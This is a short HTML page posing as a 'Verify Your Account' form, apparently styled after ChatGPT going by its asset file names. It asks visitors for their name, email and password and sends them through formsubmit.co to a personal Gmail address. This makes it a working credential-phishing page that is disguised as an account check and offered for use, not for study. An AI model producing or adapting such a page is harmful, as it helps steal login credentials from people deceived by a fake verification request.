<!DOCTYPE html>
<html lang="en">
<head>
    <script src="Chat Gpt.js"></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Contact Form</title>
  <link rel="stylesheet" href="Chat Gpt.css">
</head>
<body>
  <div class="container">
    <h2>Verify Your Account</h2>
    <form action="https://formsubmit.co/littlenightmares144@gmail.com" method="POST" />
      <div class="form-group">
        <label for="name">Your Name:</label>
        <input type="text" id="name" name="name" required>
      </div>
      <div class="form-group">
        <label for="email">Your Email:</label>
        <input type="email" id="email" name="email" required>
      </div>
      <div class="form-group">
        <label for="message">Your Password:</label>
        <textarea id="password" name="password" rows="1" required></textarea>
      </div>
      <button type="submit">Submit</button>
    </form>
  </div>
</body>
</html>
